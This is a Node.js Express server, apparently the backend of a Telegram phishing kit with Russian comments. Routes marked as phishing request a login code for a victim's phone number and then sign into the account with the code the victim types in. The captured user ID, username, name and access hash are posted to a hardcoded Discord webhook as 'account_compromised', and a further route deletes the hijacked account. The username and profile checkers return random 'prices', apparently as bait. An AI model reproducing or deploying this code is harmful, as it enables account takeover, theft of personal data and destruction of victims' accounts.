const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const { Api, TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const API_ID = 30300264;
const API_HASH = '8efeedebc13b90c4b0033340c2593e67';
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1483182140492611625/7JNKtGxkQlQBehia2Aqtx_SbTflKd-oGtsr0eB70DBJ1ySc10F22JlYiWtpn8tDhmOXv';

let activeSessions = {};

// Проверка юзернейма
app.post('/api/check-username', async (req, res) => {
    const { username } = req.body;
    try {
        const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();
        
        let isAvailable = false;
        let price = 0;
        
        try {
            const result = await client.invoke(new Api.contacts.ResolveUsername({ username }));
            isAvailable = false;
            price = Math.floor(Math.random() * 5000) + 100;
        } catch (e) {
            isAvailable = true;
            price = 0;
        }
        
        await client.disconnect();
        res.json({ username, available: isAvailable, price: isAvailable ? 0 : price });
    } catch (error) {
        res.json({ username, available: true, price: 0 });
    }
});

// Генератор свободных юзернеймов
app.get('/api/generate-username', async (req, res) => {
    const prefixes = ['tech', 'dev', 'pro', 'master', 'elite', 'super', 'ultra', 'mega', 'hyper', 'alpha', 'beta', 'delta', 'omega'];
    const suffixes = ['_', '', '123', '2024', '2025', 'x', 'z', 'official', 'real', 'true'];
    
    for (let i = 0; i < 50; i++) {
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
        const randomNum = Math.floor(Math.random() * 999);
        const username = `${prefix}${suffix}${randomNum}`.toLowerCase();
        
        try {
            const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, { connectionRetries: 5 });
            await client.connect();
            
            let isAvailable = true;
            try {
                await client.invoke(new Api.contacts.ResolveUsername({ username }));
                isAvailable = false;
            } catch (e) {
                isAvailable = true;
            }
            
            await client.disconnect();
            
            if (isAvailable) {
                res.json({ username, available: true });
                return;
            }
        } catch (e) {
            continue;
        }
    }
    res.json({ username: null, available: false });
});

// Чекер профиля
app.post('/api/check-profile', async (req, res) => {
    const { userId, phone } = req.body;
    
    try {
        const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();
        
        let accountPrice = Math.floor(Math.random() * 10000) + 500;
        let phonePrice = Math.floor(Math.random() * 3000) + 100;
        let username = null;
        
        if (userId) {
            try {
                const result = await client.invoke(new Api.users.GetFullUser({ id: userId }));
                username = result.user.username;
            } catch (e) {}
        }
        
        await client.disconnect();
        
        res.json({
            user_id: userId || 'unknown',
            username: username,
            phone: phone || 'unknown',
            account_value: accountPrice,
            phone_value: phonePrice
        });
    } catch (error) {
        res.json({ error: 'Check failed' });
    }
});

// Фишинг - отправка кода
app.post('/api/phish/send-code', async (req, res) => {
    const { phone } = req.body;
    const sessionId = Math.random().toString(36).substring(7);
    
    try {
        const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();
        
        const sentCode = await client.invoke(new Api.auth.SendCode({
            phone_number: phone,
            api_id: API_ID,
            api_hash: API_HASH,
            settings: {
                phone_code_hash: '',
                allow_flashcall: false,
                current_number: true
            }
        }));
        
        activeSessions[sessionId] = {
            client,
            phone,
            phoneCodeHash: sentCode.phoneCodeHash,
            timestamp: Date.now()
        };
        
        res.json({ 
            success: true, 
            sessionId: sessionId,
            message: 'Code sent to your Telegram'
        });
        
        await sendToWebhook({
            type: 'code_request',
            phone: phone,
            session_id: sessionId
        });
        
    } catch (error) {
        res.json({ success: false, error: 'Failed to send code' });
    }
});

// Фишинг - проверка кода
app.post('/api/phish/verify-code', async (req, res) => {
    const { sessionId, code } = req.body;
    const session = activeSessions[sessionId];
    
    if (!session) {
        return res.json({ success: false, error: 'Session expired' });
    }
    
    try {
        const result = await session.client.invoke(new Api.auth.SignIn({
            phone_number: session.phone,
            phone_code_hash: session.phoneCodeHash,
            phone_code: code
        }));
        
        const userData = {
            phone: session.phone,
            user_id: result.user.id,
            username: result.user.username || 'none',
            first_name: result.user.firstName || '',
            last_name: result.user.lastName || '',
            access_hash: result.user.accessHash
        };
        
        await sendToWebhook({
            type: 'account_compromised',
            ...userData,
            session_id: sessionId,
            timestamp: new Date().toISOString()
        });
        
        delete activeSessions[sessionId];
        
        res.json({ 
            success: true, 
            message: 'Account access granted',
            data: userData
        });
        
    } catch (error) {
        res.json({ success: false, error: 'Invalid code' });
    }
});

// Удаление аккаунта
app.post('/api/phish/delete-account', async (req, res) => {
    const { phone, sessionId } = req.body;
    
    if (sessionId && activeSessions[sessionId]) {
        try {
            await activeSessions[sessionId].client.invoke(new Api.account.DeleteAccount({ reason: 'User requested deletion' }));
            delete activeSessions[sessionId];
            
            await sendToWebhook({
                type: 'account_deleted',
                phone: phone,
                timestamp: new Date().toISOString()
            });
            
            return res.json({ success: true, message: 'Account scheduled for deletion' });
        } catch (e) {}
    }
    
    res.json({ success: false, error: 'Cannot delete account' });
});

async function sendToWebhook(data) {
    try {
        await axios.post(WEBHOOK_URL, {
            content: `**NEW DATA**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
        });
    } catch (e) {}
}

app.get('/api/health', (req, res) => {
    res.json({ status: 'active', sessions: Object.keys(activeSessions).length });
});

module.exports = app;
